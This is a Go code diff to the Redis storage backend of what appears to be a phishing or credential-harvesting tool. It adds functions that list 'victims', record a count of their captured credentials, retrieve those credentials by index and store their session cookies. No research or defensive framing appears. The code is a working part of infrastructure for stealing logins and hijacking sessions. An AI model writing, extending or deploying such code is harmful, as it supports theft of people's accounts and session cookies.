@@ -57,7 +57,25 @@ func StoreVictim(id string, victim *Victim) error {
 		return err
 	}
 
+	// push the victimId
+	_, err := rc.Do("RPUSH", "victims", id)
+	if err != nil {
+		return err
+	}
+
 	return nil
+}
+
+func GetAllVictims() ([]string, error) {
+	rc := RedisPool.Get()
+	defer rc.Close()
+
+	values, err := redis.Strings(rc.Do("LRANGE", "victims", "0", "-1"))
+	if err != nil {
+		return nil, err
+	}
+
+	return values, nil
 }
 
 func StoreVictimCreds(id string, victim *VictimCredential) error {
@@ -78,8 +96,12 @@ func StoreVictimCreds(id string, victim *VictimCredential) error {
 	}
 
 	// increase the credentials count
+	// TODO implement this with REDIS HINCRBY
 	key = fmt.Sprintf("victim:%s", id)
-	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).Add("creds_count").Add(v.CredsCount+1)); err != nil {
+	increment := make(map[string]string)
+	increment["creds_count"] = fmt.Sprintf("%d", v.CredsCount+1)
+
+	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(increment)...); err != nil {
 		log.Printf("error doing redis HMSET: %s. victim creds not saved.", err)
 		return err
 	}
@@ -87,7 +109,27 @@ func StoreVictimCreds(id string, victim *VictimCredential) error {
 	return nil
 }
 
-func storeVictimCookie(id string, cookie *VictimCookie) error {
+func GetVictimCreds(victimId string, index int) (*VictimCredential, error) {
+	rc := RedisPool.Get()
+	defer rc.Close()
+
+	var v VictimCredential
+	vid := fmt.Sprintf("victim:%s:creds:%d", victimId, index)
+
+	value, err := redis.Values(rc.Do("HGETALL", vid))
+	if err != nil {
+		return nil, err
+	}
+
+	err = redis.ScanStruct(value, &v)
+	if err != nil {
+		return nil, err
+	}
+
+	return &v, nil
+}
+
+func StoreVictimCookie(id string, cookie *VictimCookie) error {
 
 	rc := RedisPool.Get()
 	defer rc.Close()
@@ -108,9 +150,9 @@ func GetVictim(id string) (*Victim, error) {
 	defer rc.Close()
 
 	var v Victim
-	emailId := fmt.Sprintf("victim:%s", id)
+	vid := fmt.Sprintf("victim:%s", id)
 
-	value, err := redis.Values(rc.Do("HGETALL", emailId))
+	value, err := redis.Values(rc.Do("HGETALL", vid))
 	if err != nil {
 		return nil, err
 	}
